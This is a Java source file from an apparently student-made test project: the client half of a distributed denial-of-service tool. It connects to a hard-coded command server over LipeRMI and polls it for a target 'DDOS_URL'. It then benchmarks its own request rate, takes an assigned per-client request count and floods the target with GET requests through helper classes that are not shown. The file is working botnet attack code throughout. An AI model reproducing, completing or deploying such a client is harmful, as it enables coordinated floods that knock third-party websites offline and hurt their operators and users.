/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.example.senura.lipermitest1;


import java.io.IOException;

import java.util.Timer;
import java.util.TimerTask;


import net.sf.lipermi.handler.CallHandler;
import net.sf.lipermi.net.Client;


/**
 *
 * @author senura
 */
public class ClientConnection {
    
    private static TestService remoteObject=null;
    private static boolean isServerCameOnline=false;
    
    private static String DDOS_URL;
    
    //to calculate the gets per sec
    static long startMilisecs;
    static int getCount;
    static boolean isgetCountCalculated;
    static boolean isCountFirstRun;
    
    //regarding to perCliedProposedDDOSCount
    static boolean isGETCompleted=false;
    static boolean sendGetFuncRan=false;
    
    
    public static void main(String[] args) {
        initGlobalVariables();
        setTimerToCheckServerAvailability();
    }
    
    
    private static void setClient(){
        
        CallHandler callHandler = new CallHandler();
        String remoteHost = "172.20.8.65";//"192.168.1.4";
        int portWasBinded = 58882;
        
        Client client=null;
       
        try {
            client = new Client(remoteHost, portWasBinded, callHandler);
            isServerCameOnline=true;
        } catch (IOException ex) {
            System.out.println(TimeClass.getTime()+" server is not online");
        }
        
        
        if(client!=null){
        remoteObject =
                (TestService) client.getGlobal(TestService.class);
        
        System.out.println(remoteObject.getResponse("Hey babe.."));
        
            setTimerToCheckURLAvailability();

        }
    }
    
  
      
      
      private static boolean checkURLAvailable(){
      
          try{
          
              
          if(remoteObject.isHavingHostURL()) {
              
              System.out.println("isCountFirstRun = "+isCountFirstRun+" isgetCountCalculated = "+isgetCountCalculated);
            if(!isgetCountCalculated && isCountFirstRun){
                
                System.out.println("inside if");
                
            DDOS_URL=remoteObject.getURL();
            System.out.println(DDOS_URL);
            
            countNumOfConPerSec();///////
            isCountFirstRun=false;
            
            }
            
            
            
            //GETRequestHandlers.sendGet(DDOS_URL);
        }
        else
            System.out.println(TimeClass.getTime()+" Not having a URL");
          }catch(java.lang.reflect.UndeclaredThrowableException ex){
              System.out.println(TimeClass.getTime()+" Server gone Offline");
              isServerCameOnline=false;
              initGlobalVariables();
              setTimerToCheckServerAvailability();
              //setClient();
              return false;
          }
          return true;
      }
      
      
      
       
      
      
      
      
      
      
      //Timers
      private static void setTimerToCheckURLAvailability(){
          Timer timer = new Timer();
          TimerTask myTask = new TimerTask() {
              @Override
              public void run() {
                  System.out.println(">>>>>>>>URLAvailability ran");
                  
                  if(!isGETCompleted && isgetCountCalculated){
                      
                  int _DDOSCountForThisClient=0;
                  _DDOSCountForThisClient=ClientControllerCon.takeNumOfDDOSToBeExcecuted();
                  if(_DDOSCountForThisClient!=0) {
                      if(!GETRequestHandlers.sendGets(DDOS_URL, _DDOSCountForThisClient))
                      {System.out.println("Sending gets to the DDOS URL Failed");
                      isGETCompleted=true;}
                      else  isGETCompleted=true;
                  }
                  
                  }
                  
                  if(!checkURLAvailable()) {
                      System.out.println("-------------------------------------------");
                      
                      timer.cancel();
                  }
                 
              }
          };

          timer.schedule(myTask, 3000, 3000);
      }
      
      
      private static void setTimerToCheckServerAvailability(){
          Timer timer = new Timer();
          TimerTask myTask = new TimerTask() {
              @Override
              public void run() {
                  System.out.println("setTimerToCheckServerAvailability ran");
                  if(isCountFirstRun==true && isgetCountCalculated==true) isgetCountCalculated=false;
                  setClient();
                  if(isServerCameOnline) timer.cancel();
              }
          };

          timer.schedule(myTask, 2000, 2000);
      }
      
      
      private static void setTimerToCountGets(String sampleUrl){
          Timer timer = new Timer();
          TimerTask myTask = new TimerTask() {
              @Override
              public void run() {
                  System.out.println("setTimerToCountGets ran");
                  if(GETRequestHandlers.sendGetsToCalculateTimeElapsed(sampleUrl)){
                      System.out.println("CANCEEEEEEEEELLL");
                  timer.cancel();
                  }
              }
          };

          timer.schedule(myTask, 1000, 1000);
      }
      
      //////////
      private static void setTimerToGetTheDDOSCount(){
          Timer timer = new Timer();
          TimerTask myTask = new TimerTask() {
              @Override
              public void run() {
                 
              }
          };

          timer.schedule(myTask, 1000, 1000);
      }
      //////////
      
      
      private static void countNumOfConPerSec(){
         
          if(startMilisecs==0)
          startMilisecs= System.currentTimeMillis();
          
          if(!DDOS_URL.equals(""))setTimerToCountGets(DDOS_URL);
         
         
//         if(remoteObject.isHavingHostURL()) {
//            String sampleUrl=remoteObject.getURL();
//            
//            
//         setTimerToCountGets(sampleUrl);
//         }
         
      }
      
      
      private static void initGlobalVariables(){
      
            DDOS_URL="";
            startMilisecs=0;
            getCount=0;
            isgetCountCalculated=false;
            isCountFirstRun=true;
            isGETCompleted=false;
            sendGetFuncRan=false;
    
      }
      
      
      
      
    
    
    
    
}
